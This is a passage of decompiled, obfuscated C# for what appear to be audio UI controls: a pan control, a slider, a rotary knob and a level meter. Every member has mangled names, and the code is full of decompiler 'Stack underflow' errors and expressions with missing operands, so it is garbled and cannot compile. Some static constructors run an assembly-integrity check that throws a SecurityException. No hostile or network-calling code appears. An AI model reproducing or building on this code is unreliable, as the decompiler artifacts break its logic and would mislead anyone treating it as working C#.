				//IL_004d: Incompatible stack heights: 0 vs 1
				//IL_0050: Incompatible stack heights: 0 vs 1
				_ = 100.0;
				_ = ((_0002)/*Error near IL_004d: Stack underflow*/).Value;
				int num = ((_007F._0003)/*Error near IL_0014: Stack underflow*/)._0001._0001._0001;
				_003F val = /*Error near IL_001f: Stack underflow*/- num;
				return /*Error near IL_0021: Stack underflow*/* (double)val / (double)(base._0001._0001._0002 - base._0001._0001._0001);
			}
			set
			{
				//IL_001f: Unknown result type (might be due to invalid IL or missing references)
				//IL_0042: Unknown result type (might be due to invalid IL or missing references)
				//IL_0043: Unknown result type (might be due to invalid IL or missing references)
				//IL_004c: Incompatible stack heights: 0 vs 1
				//IL_004f: Incompatible stack heights: 0 vs 1
				//IL_0052: Incompatible stack heights: 0 vs 2
				_ = (double)((_007F._0003)/*Error near IL_0009: Stack underflow*/)._0001._0001._0001;
				_003F val = /*Error near IL_0020: Stack underflow*// 100.0;
				int num = base._0001._0001._0002;
				int num2 = base._0001._0001._0001;
				_003F val2 = /*Error near IL_0044: Stack underflow*/+ val * (double)(num - num2);
				((_0002)/*Error near IL_004a: Stack underflow*/).Value = (int)val2;
			}
		}

		internal _0002(global::_0015._0003._0008 _001B_008F_0006, IntPtr _001C_008F_0006, _001D._0001 _001D_008F_0006, int _001E_008F_0006)
		{
			base._0001 = _001B_008F_0006;
			base._0001 = _001C_008F_0006;
			base._0001 = _001D_008F_0006;
			base._0001 = _001E_008F_0006;
			base._0001 = default(global::_0015._0003._0001);
			_0001();
		}

		protected override void _0001(IntPtr _0002)
		{
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 2
			//IL_003a: Incompatible stack heights: 0 vs 2
			_ = _0097._0088_0004;
			_ = ((_007F._0003)/*Error near IL_000e: Stack underflow*/)._0001._0002;
			_0091._0080_0004(typeof(global::_0015._0003._000F).TypeHandle);
			global::_0015._0003._000F obj = (global::_0015._0003._000F)/*Error near IL_0024: Stack underflow*/((IntPtr)/*Error near IL_0024: Stack underflow*/, (Type)/*Error near IL_0024: Stack underflow*/);
			((_0002)/*Error near IL_002e: Stack underflow*/).m__0001 = obj;
		}

		public override string ToString()
		{
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			_ = _009D._0093_0004;
			_0080._0014._0001(107394709);
			((_007F._0003)/*Error near IL_0030: Stack underflow*/).ToString();
			object obj = Percent;
			return /*Error near IL_0020: Stack underflow*/((string)/*Error near IL_0020: Stack underflow*/, (object)/*Error near IL_0020: Stack underflow*/, obj);
		}
	}
}
namespace _000F
{
	internal sealed class _0002 : _007F._0003
	{
		private new _0015._0003._0011[] m__0001;

		public uint Value
		{
			get
			{
				//IL_0018: Incompatible stack heights: 0 vs 1
				//IL_0022: Incompatible stack heights: 0 vs 1
				((_007F._0003)/*Error near IL_001f: Stack underflow*/)._0001();
				return ((_0002)/*Error near IL_000b: Stack underflow*/).m__0001[0]._0001;
			}
			set
			{
				//IL_00e0: Incompatible stack heights: 0 vs 2
				//IL_00ea: Incompatible stack heights: 0 vs 1
				_ = _0098._0089_0004;
				object obj = ((_0002)/*Error near IL_000f: Stack underflow*/).m__0001[0];
				/*Error near IL_00ea: Stack underflow*/(obj);
				int num = (int)/*Error near IL_00f0: Stack underflow*/;
				base._0001._0002 = _0099._008C_0004(num * base._0001);
				for (int i = 0; i < base._0001; i++)
				{
					this.m__0001[i]._0001 = value;
					long num2 = base._0001._0002.ToInt64() + num * i;
					_009A._008F_0004(this.m__0001[i], _009C._0092_0004(num2), false);
				}
				global::_0011._0018._0001(global::_0011._0018._0001(base._0001, ref base._0001, _001D._0001._0002 | base._0001), _0080._0014._0001(107395985));
				_009B._0090_0004(base._0001._0002);
			}
		}

		public uint MinValue => (uint)((_007F._0003)/*Error near IL_0007: Stack underflow*/)._0001._0001._0001;

		public uint MaxValue => (uint)((_007F._0003)/*Error near IL_0007: Stack underflow*/)._0001._0001._0002;

		public double Percent
		{
			get
			{
				//IL_001e: Unknown result type (might be due to invalid IL or missing references)
				//IL_0021: Unknown result type (might be due to invalid IL or missing references)
				//IL_0045: Unknown result type (might be due to invalid IL or missing references)
				//IL_0047: Expected F8, but got Unknown
				//IL_0048: Incompatible stack heights: 0 vs 2
				//IL_004f: Incompatible stack heights: 0 vs 1
				//IL_0052: Incompatible stack heights: 0 vs 1
				_ = 100.0;
				_ = ((_0002)/*Error near IL_004f: Stack underflow*/).Value;
				int num = ((_007F._0003)/*Error near IL_0014: Stack underflow*/)._0001._0001._0001;
				_003F val = /*Error near IL_001f: Stack underflow*/- num;
				return /*Error near IL_0022: Stack underflow*/* (double)val / (double)(uint)(base._0001._0001._0002 - base._0001._0001._0001);
			}
			set
			{
				//IL_0020: Unknown result type (might be due to invalid IL or missing references)
				//IL_0044: Unknown result type (might be due to invalid IL or missing references)
				//IL_0045: Unknown result type (might be due to invalid IL or missing references)
				//IL_004e: Incompatible stack heights: 0 vs 1
				//IL_0051: Incompatible stack heights: 0 vs 1
				//IL_0054: Incompatible stack heights: 0 vs 2
				_ = (double)(uint)((_007F._0003)/*Error near IL_0009: Stack underflow*/)._0001._0001._0001;
				_003F val = /*Error near IL_0021: Stack underflow*// 100.0;
				int num = base._0001._0001._0002;
				int num2 = base._0001._0001._0001;
				_003F val2 = /*Error near IL_0046: Stack underflow*/+ val * (double)(uint)(num - num2);
				((_0002)/*Error near IL_004c: Stack underflow*/).Value = (uint)val2;
			}
		}

		internal _0002(_0015._0003._0008 _001B_008F_0006, IntPtr _001C_008F_0006, _001D._0001 _001D_008F_0006, int _001E_008F_0006)
		{
			base._0001 = _001B_008F_0006;
			base._0001 = _001C_008F_0006;
			base._0001 = _001D_008F_0006;
			base._0001 = _001E_008F_0006;
			base._0001 = default(_0015._0003._0001);
			_0001();
		}

		protected override void _0001(IntPtr _0002)
		{
			//IL_005c: Incompatible stack heights: 0 vs 1
			//IL_005f: Incompatible stack heights: 0 vs 1
			_0015._0003._0011[] array = new _0015._0003._0011[((_007F._0003)/*Error near IL_0009: Stack underflow*/)._0001];
			((_0002)/*Error near IL_0013: Stack underflow*/).m__0001 = array;
			for (int i = 0; i < base._0001; i++)
			{
				this.m__0001[i] = (_0015._0003._0011)_0097._0088_0004(base._0001._0002, _0091._0080_0004(typeof(_0015._0003._0011).TypeHandle));
			}
		}

		public override string ToString()
		{
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			_ = _009D._0093_0004;
			_0080._0014._0001(107394709);
			((_007F._0003)/*Error near IL_0030: Stack underflow*/).ToString();
			object obj = Percent;
			return /*Error near IL_0020: Stack underflow*/((string)/*Error near IL_0020: Stack underflow*/, (object)/*Error near IL_0020: Stack underflow*/, obj);
		}

		static _0002()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0015
{
	internal sealed class _0004 : Control
	{
		private int m__0001;

		private int m__0002;

		internal float _0001;

		internal Orientation _0001;

		internal Container _0001;

		internal readonly int _0003 = 30;

		internal readonly int _0004 = 15;

		internal Rectangle _0001;

		private bool m__0001;

		private int _0005;

		public int Minimum
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004)/*Error near IL_0009: Stack underflow*/).m__0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int Maximum
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004)/*Error near IL_0009: Stack underflow*/).m__0002 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int Value
		{
			get
			{
				//IL_0015: Unknown result type (might be due to invalid IL or missing references)
				//IL_0017: Unknown result type (might be due to invalid IL or missing references)
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0025: Incompatible stack heights: 0 vs 2
				//IL_0028: Incompatible stack heights: 0 vs 2
				_ = ((_0004)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((_0004)/*Error near IL_000e: Stack underflow*/).m__0002;
				int num = ((_0004)/*Error near IL_0015: Stack underflow*/).m__0001;
				_003F val = /*Error near IL_0016: Stack underflow*/- num;
				return (int)(/*Error near IL_0018: Stack underflow*/ * (float)val) + this.m__0001;
			}
			set
			{
				//IL_000b: Unknown result type (might be due to invalid IL or missing references)
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				int num = ((_0004)/*Error near IL_000b: Stack underflow*/).m__0001;
				float num2 = (float)(/*Error near IL_000c: Stack underflow*/ - num) / (float)(this.m__0002 - this.m__0001);
				((_0004)/*Error near IL_0021: Stack underflow*/)._0001 = num2;
			}
		}

		public Orientation Orientation
		{
			get
			{
				//IL_0002: Unknown result type (might be due to invalid IL or missing references)
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_0004: Unknown result type (might be due to invalid IL or missing references)
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000d: Unknown result type (might be due to invalid IL or missing references)
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004)/*Error near IL_0009: Stack underflow*/)._0001 = (Orientation)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0004()
		{
			this._0001 = new Container();
			((Control)this).SetStyle((ControlStyles)73730, true);
		}

		protected override void _0001(bool _0002)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0004)/*Error near IL_000b: Stack underflow*/)._0001 != null)
			{
				_ = global::_0008._007E_009B;
				Container container = ((_0004)/*Error near IL_0019: Stack underflow*/)._0001;
				/*Error near IL_001e: Stack underflow*/(container);
			}
			global::_0005._0088(this, _0002);
		}

		protected override void _0001(PaintEventArgs _0002)
		{
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Invalid comparison between Unknown and I4
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0024: Expected O, but got Unknown
			//IL_0078: Incompatible stack heights: 0 vs 2
			//IL_007f: Incompatible stack heights: 0 vs 1
			_ = _009F._007E_0095_0004;
			/*Error near IL_007f: Stack underflow*/((object)/*Error near IL_007f: Stack underflow*/);
			Graphics val = (Graphics)/*Error near IL_0085: Stack underflow*/;
			if ((int)this._0001 == 1)
			{
				Brush val2 = (Brush)new SolidBrush(_0001_0002._0096_0004());
				_0002_0002._007E_0099_0004(val, val2, global::_001A._0012_0003(this) / 2, this._0003 / 2, 2, global::_001A._0013_0003(this) - this._0003);
				global::_0008._007E_009C(val2);
				global::_0011._0018._0001(this, val);
			}
			_0003_0002._009A_0004(this, _0002);
		}

		protected unsafe override void _0001(MouseEventArgs _0002)
		{
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_0057: Incompatible stack heights: 0 vs 3
			//IL_005e: Incompatible stack heights: 0 vs 1
			_ = ref ((_0004)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = global::_001A._007E_0014_0003;
			/*Error near IL_005e: Stack underflow*/((object)/*Error near IL_005e: Stack underflow*/);
			int y = global::_001A._007E_0015_0003(_0002);
			if (((Rectangle*)/*Error near IL_0020: Stack underflow*/)->Contains((int)/*Error near IL_0020: Stack underflow*/, y))
			{
				this.m__0001 = true;
				_0005 = global::_001A._007E_0015_0003(_0002) - this._0001.Y;
			}
			_0004_0002._009B_0004(this, _0002);
		}

		protected override void _0002(MouseEventArgs _0002)
		{
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Expected I4, but got Unknown
			//IL_0088: Incompatible stack heights: 0 vs 1
			//IL_008e: Incompatible stack heights: 0 vs 2
			//IL_0098: Incompatible stack heights: 0 vs 1
			if (((_0004)/*Error near IL_000a: Stack underflow*/).m__0001)
			{
				_ = global::_001A._007E_0015_0003;
				/*Error near IL_0098: Stack underflow*/((object)/*Error near IL_0098: Stack underflow*/);
				int num = _0005;
				int num2 = /*Error near IL_001f: Stack underflow*/- num;
				if (num2 < 0)
				{
					this._0001 = 0f;
				}
				else if (num2 > global::_001A._0013_0003(this) - this._0003)
				{
					this._0001 = 1f;
				}
				else
				{
					this._0001 = (float)num2 / (float)(global::_001A._0013_0003(this) - this._0003);
				}
				global::_0008._009D(this);
			}
			_0004_0002._009C_0004(this, _0002);
		}

		protected override void _0003(MouseEventArgs _0002)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 2
			//IL_001e: Incompatible stack heights: 0 vs 1
			((_0004)/*Error near IL_0008: Stack underflow*/).m__0001 = false;
			_ = _0004_0002._009D_0004;
			/*Error near IL_0016: Stack underflow*/((object)/*Error near IL_0016: Stack underflow*/, (MouseEventArgs)/*Error near IL_0016: Stack underflow*/);
		}
	}
}
namespace _0014
{
	internal sealed class _0001 : UserControl
	{
		private Container m__0001;

		private float m__0001;

		[CompilerGenerated]
		private EventHandler m__0001;

		public float Pan
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0001)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0007: Invalid comparison between Unknown and F4
				//IL_0017: Invalid comparison between Unknown and F4
				//IL_005b: Incompatible stack heights: 0 vs 1
				//IL_0062: Incompatible stack heights: 0 vs 1
				if (!((float)/*Error near IL_0009: Stack underflow*/ >= -1f))
				{
					value = -1f;
				}
				if (!((float)/*Error near IL_0019: Stack underflow*/ <= 1f))
				{
					value = 1f;
				}
				if (value != this.m__0001)
				{
					this.m__0001 = value;
					if (this.m__0001 != null)
					{
						_0015_0002._007E_0017_0005(this.m__0001, this, EventArgs.Empty);
					}
					global::_0008._009D(this);
				}
			}
		}

		public event EventHandler PanChanged
		{
			[CompilerGenerated]
			add
			{
				//IL_0032: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				EventHandler eventHandler = ((_0001)/*Error near IL_0007: Stack underflow*/).m__0001;
				EventHandler eventHandler2;
				do
				{
					eventHandler2 = (EventHandler)/*Error near IL_000c: Stack underflow*/;
					EventHandler value2 = (EventHandler)_0005_0002._009F_0004(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_0032: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				EventHandler eventHandler = ((_0001)/*Error near IL_0007: Stack underflow*/).m__0001;
				EventHandler eventHandler2;
				do
				{
					eventHandler2 = (EventHandler)/*Error near IL_000c: Stack underflow*/;
					EventHandler value2 = (EventHandler)_0005_0002._0001_0005(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _0001()
		{
			global::_0011._0018._0001(this);
		}

		protected override void _0001(bool _0002)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0001)/*Error near IL_000b: Stack underflow*/).m__0001 != null)
			{
				_ = global::_0008._007E_009B;
				Container container = ((_0001)/*Error near IL_0019: Stack underflow*/).m__0001;
				/*Error near IL_001e: Stack underflow*/(container);
			}
			global::_0005._0089(this, _0002);
		}

		protected override void _0001(PaintEventArgs _0002)
		{
			//IL_0215: Unknown result type (might be due to invalid IL or missing references)
			//IL_021a: Incompatible stack heights: 0 vs 1
			//IL_0226: Incompatible stack heights: 0 vs 2
			new StringFormat();
			StringFormat val = (StringFormat)/*Error near IL_0220: Stack underflow*/;
			_ = _0006_0002._007E_0002_0005;
			/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (StringAlignment)1);
			_0006_0002._007E_0003_0005(val, (StringAlignment)1);
			string text;
			if ((double)this.m__0001 == 0.0)
			{
				_0002_0002._007E_0099_0004(_009F._007E_0095_0004(_0002), _0007_0002._0004_0005(), global::_001A._0012_0003(this) / 2 - 1, 1, 3, global::_001A._0013_0003(this) - 2);
				text = _0080._0014._0001(107394664);
			}
			else if (this.m__0001 > 0f)
			{
				_0002_0002._007E_0099_0004(_009F._007E_0095_0004(_0002), _0007_0002._0004_0005(), global::_001A._0012_0003(this) / 2, 1, (int)((float)(global::_001A._0012_0003(this) / 2) * this.m__0001), global::_001A._0013_0003(this) - 2);
				text = _0008_0002._0007_0005(_0080._0014._0001(107394659), this.m__0001 * 100f);
			}
			else
			{
				_0002_0002._007E_0099_0004(_009F._007E_0095_0004(_0002), _0007_0002._0004_0005(), (int)((float)(global::_001A._0012_0003(this) / 2) * (this.m__0001 + 1f)), 1, (int)((float)(global::_001A._0012_0003(this) / 2) * (0f - this.m__0001)), global::_001A._0013_0003(this) - 2);
				text = _0008_0002._0007_0005(_0080._0014._0001(107394678), this.m__0001 * -100f);
			}
			_000F_0002._007E_000E_0005(_009F._007E_0095_0004(_0002), _000E_0002._0008_0005(), 0, 0, global::_001A._0012_0003(this) - 1, global::_001A._0013_0003(this) - 1);
			_0013_0002._007E_0015_0005(_009F._007E_0095_0004(_0002), text, _0010_0002._007E_0010_0005(this), _0007_0002._0005_0005(), _0012_0002._0014_0005(_0011_0002._0011_0005(this)), val);
		}

		protected override void _0001(MouseEventArgs _0002)
		{
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_0030: Incompatible stack heights: 0 vs 2
			//IL_0032: Unknown result type (might be due to invalid IL or missing references)
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 2
			_ = _0014_0002._007E_0016_0005;
			/*Error near IL_0037: Stack underflow*/((object)/*Error near IL_0037: Stack underflow*/);
			if ((int)/*Error near IL_0010: Stack underflow*/ == 1048576)
			{
				_ = global::_001A._007E_0014_0003;
				global::_0011._0018._0001(/*Error near IL_001c: Stack underflow*/((object)/*Error near IL_001c: Stack underflow*/), this);
			}
			_0004_0002._009C_0004(this, _0002);
		}

		protected override void _0002(MouseEventArgs _0002)
		{
			//IL_001e: Incompatible stack heights: 0 vs 2
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			_ = global::_001A._007E_0014_0003;
			/*Error near IL_0025: Stack underflow*/((object)/*Error near IL_0025: Stack underflow*/);
			global::_0011._0018._0001((int)/*Error near IL_0010: Stack underflow*/, (_0001)/*Error near IL_0010: Stack underflow*/);
			_0004_0002._009E_0004(this, _0002);
		}

		static _0001()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0010
{
	internal sealed class _0002 : UserControl
	{
		private double m__0001;

		private double m__0002 = 1.0;

		internal double _0003 = 0.5;

		private int m__0001;

		private double _0004;

		private bool m__0001;

		[CompilerGenerated]
		internal EventHandler _0001;

		private IContainer m__0001;

		public double Minimum
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0009: Invalid comparison between Unknown and F8
				//IL_003b: Incompatible stack heights: 0 vs 1
				//IL_003e: Incompatible stack heights: 0 vs 1
				//IL_0045: Incompatible stack heights: 0 vs 1
				double num = ((_0002)/*Error near IL_0009: Stack underflow*/).m__0002;
				if (!((double)/*Error near IL_000b: Stack underflow*/ < num))
				{
					global::_0080._0014._0001(107394633);
					throw new ArgumentOutOfRangeException((string?)/*Error near IL_0017: Stack underflow*/);
				}
				this.m__0001 = value;
				if (this._0003 < this.m__0001)
				{
					Value = this.m__0001;
				}
			}
		}

		public double Maximum
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			set
			{
				//IL_0009: Invalid comparison between Unknown and F8
				//IL_003b: Incompatible stack heights: 0 vs 1
				//IL_003e: Incompatible stack heights: 0 vs 1
				//IL_0045: Incompatible stack heights: 0 vs 1
				double num = ((_0002)/*Error near IL_0009: Stack underflow*/).m__0001;
				if (!((double)/*Error near IL_000b: Stack underflow*/ > num))
				{
					global::_0080._0014._0001(107394620);
					throw new ArgumentOutOfRangeException((string?)/*Error near IL_0017: Stack underflow*/);
				}
				this.m__0002 = value;
				if (this._0003 > this.m__0002)
				{
					Value = this.m__0002;
				}
			}
		}

		public double Value
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			set
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				//IL_000c: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0002)/*Error near IL_0013: Stack underflow*/, (double)/*Error near IL_0013: Stack underflow*/, false);
			}
		}

		public event EventHandler ValueChanged
		{
			[CompilerGenerated]
			add
			{
				//IL_0032: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				EventHandler eventHandler = ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler eventHandler2;
				do
				{
					eventHandler2 = (EventHandler)/*Error near IL_000c: Stack underflow*/;
					EventHandler value2 = (EventHandler)_0005_0002._009F_0004(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_0032: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				EventHandler eventHandler = ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler eventHandler2;
				do
				{
					eventHandler2 = (EventHandler)/*Error near IL_000c: Stack underflow*/;
					EventHandler value2 = (EventHandler)_0005_0002._0001_0005(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _0002()
		{
			((Control)this).SetStyle((ControlStyles)73730, true);
			global::_0011._0018._0001(this);
		}

		protected override void _0001(PaintEventArgs _0002)
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_003d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0043: Expected O, but got Unknown
			//IL_01b6: Incompatible stack heights: 0 vs 3
			//IL_01c0: Incompatible stack heights: 0 vs 1
			//IL_01c6: Incompatible stack heights: 0 vs 3
			_ = _0016_0002._0018_0005;
			_ = global::_001A._0012_0003;
			/*Error near IL_01c0: Stack underflow*/((object)/*Error near IL_01c0: Stack underflow*/);
			_ = /*Error near IL_0016: Stack underflow*/- 4;
			_ = global::_001A._0013_0003;
			int num = /*Error near IL_0025: Stack underflow*/((object)/*Error near IL_0025: Stack underflow*/);
			int num2 = /*Error near IL_002c: Stack underflow*/((int)/*Error near IL_002c: Stack underflow*/, num - 4);
			Pen val = new Pen(_0017_0002._007E_001A_0005(this), 3f);
			_0018_0002._007E_001B_0005(val, (LineJoin)2);
			GraphicsState val2 = _0019_0002._007E_001C_0005(_009F._007E_0095_0004(_0002));
			_001A_0002._007E_001D_0005(_009F._007E_0095_0004(_0002), global::_001A._0012_0003(this) / 2, global::_001A._0013_0003(this) / 2);
			_001B_0002._007E_001E_0005(_009F._007E_0095_0004(_0002), (SmoothingMode)4);
			_001C_0002._007E_001F_0005(_009F._007E_0095_0004(_0002), val, new Rectangle(num2 / -2, num2 / -2, num2, num2), 135f, 270f);
			double num3 = (this._0003 - this.m__0001) / (this.m__0002 - this.m__0001);
			double num4 = 135.0 + num3 * 270.0;
			double num5 = (double)num2 / 2.0 * global::_0015._009A_0002(Math.PI * num4 / 180.0);
			double num6 = (double)num2 / 2.0 * global::_0015._009B_0002(Math.PI * num4 / 180.0);
			_001D_0002._007E_007F_0005(_009F._007E_0095_0004(_0002), val, 0f, 0f, (float)num5, (float)num6);
			_001E_0002._007E_0080_0005(_009F._007E_0095_0004(_0002), val2);
			_0003_0002._009A_0004(this, _0002);
		}

		protected override void _0001(MouseEventArgs _0002)
		{
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 2
			((_0002)/*Error near IL_0008: Stack underflow*/).m__0001 = true;
			_ = global::_001A._007E_0015_0003;
			int num = /*Error near IL_0016: Stack underflow*/((object)/*Error near IL_0016: Stack underflow*/);
			((_0002)/*Error near IL_001b: Stack underflow*/).m__0001 = num;
			_0004 = this._0003;
			_0004_0002._009E_0004(this, _0002);
		}

		protected override void _0002(MouseEventArgs _0002)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 2
			//IL_001e: Incompatible stack heights: 0 vs 1
			((_0002)/*Error near IL_0008: Stack underflow*/).m__0001 = false;
			_ = _0004_0002._009D_0004;
			/*Error near IL_0016: Stack underflow*/((object)/*Error near IL_0016: Stack underflow*/, (MouseEventArgs)/*Error near IL_0016: Stack underflow*/);
		}

		protected override void _0003(MouseEventArgs _0002)
		{
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_001e: Expected I4, but got Unknown
			//IL_0078: Incompatible stack heights: 0 vs 1
			//IL_007e: Incompatible stack heights: 0 vs 1
			//IL_0084: Incompatible stack heights: 0 vs 3
			if (((_0002)/*Error near IL_0007: Stack underflow*/).m__0001)
			{
				_ = ((_0002)/*Error near IL_0010: Stack underflow*/).m__0001;
				_ = global::_001A._007E_0015_0003;
				int num = /*Error near IL_001c: Stack underflow*/((object)/*Error near IL_001c: Stack underflow*/);
				int num2 = /*Error near IL_001d: Stack underflow*/- num;
				double num3 = (this.m__0002 - this.m__0001) * ((double)num2 / 150.0);
				double num4 = _0004 + num3;
				if (num4 < this.m__0001)
				{
					num4 = this.m__0001;
				}
				if (num4 > this.m__0002)
				{
					num4 = this.m__0002;
				}
				global::_0011._0018._0001(this, num4, true);
			}
			_0004_0002._009C_0004(this, _0002);
		}

		protected override void _0001(bool _0002)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0002)/*Error near IL_000b: Stack underflow*/).m__0001 != null)
			{
				_ = global::_0008._007E_0098;
				IContainer container = ((_0002)/*Error near IL_0019: Stack underflow*/).m__0001;
				/*Error near IL_001e: Stack underflow*/(container);
			}
			global::_0005._0089(this, _0002);
		}
	}
}
namespace _001F
{
	internal sealed class _0001 : Control
	{
		private Brush m__0001;

		internal float _0001;

		[CompilerGenerated]
		private float _0002;

		[CompilerGenerated]
		private float _0003;

		[CompilerGenerated]
		private Orientation m__0001;

		internal IContainer _0001;

		[DefaultValue(-3.0)]
		public float Amplitude
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0001)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_0017: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 2
				((_0001)/*Error near IL_0009: Stack underflow*/)._0001 = (float)/*Error near IL_0009: Stack underflow*/;
				_ = global::_0008._009D;
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
			}
		}

		[DefaultValue(-60.0)]
		public float MinDb
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0001)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0001)/*Error near IL_0009: Stack underflow*/)._0002 = (float)/*Error near IL_0009: Stack underflow*/;
			}
